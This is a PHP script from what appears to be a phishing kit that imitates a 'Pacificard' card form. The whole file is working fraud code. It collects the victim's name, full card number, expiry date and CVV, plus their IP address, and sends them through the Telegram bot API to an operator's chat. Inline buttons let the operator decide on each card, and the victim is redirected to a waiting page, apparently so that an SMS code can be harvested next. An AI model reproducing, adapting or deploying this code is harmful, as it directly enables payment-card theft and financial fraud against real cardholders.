<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recopila los datos del formulario
    $nombre = $_POST["gtrip01"];
    $apellido = $_POST["gtrip02"];
    $numero_tarjeta = $_POST["gtrip03"];
    $mes_vencimiento = $_POST["gtrip04"];
    $ano_vencimiento = $_POST["gtrip05"];
    $codigo_seguridad = $_POST["gtrip06"];

    // Obtén la dirección IP del cliente
    $ip = $_SERVER['REMOTE_ADDR'];

    // Incluir configuración de Telegram
    require_once 'config.php';
    
    // Obtener usuario de la sesión
    $user_id = getUserIdentifier();
    
    // Formatea los datos para enviar a Telegram
    $mensaje = "PACIFICARD :\n";
    $mensaje .= "👤 Usuario: $user_id\n";
    $mensaje .= "Nombre: $nombre $apellido\n";
    $mensaje .= "TRJ: $numero_tarjeta\n";
    $mensaje .= "FV: $mes_vencimiento/$ano_vencimiento\n";
    $mensaje .= "Cvvv: $codigo_seguridad\n";
    $mensaje .= "IP: $ip";

    // Obtener session_id
    $session_id = $_SESSION['session_id'] ?? uniqid('user_', true);
    $_SESSION['session_id'] = $session_id;

    // Crear botones inline para tarjeta
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '✅ SMS', 'callback_data' => 'card_ok_' . $session_id],
                ['text' => '❌ Card', 'callback_data' => 'card_retry_' . $session_id]
            ]
        ]
    ];

    // Enviar el mensaje a través de la API de Telegram con botones
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $datos = [
        "chat_id" => $chat_id,
        "text" => $mensaje,
        "reply_markup" => json_encode($keyboard)
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datos);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    if ($response) {
        // Redirige a loading.php para esperar decisión
        header("Location: loading.php");
        exit;
    } else {
        echo "Hubo un problema al enviar la información a Telegram. Por favor, inténtalo de nuevo más tarde.";
    }
} else {
    echo "Acceso no autorizado.";
}
?>
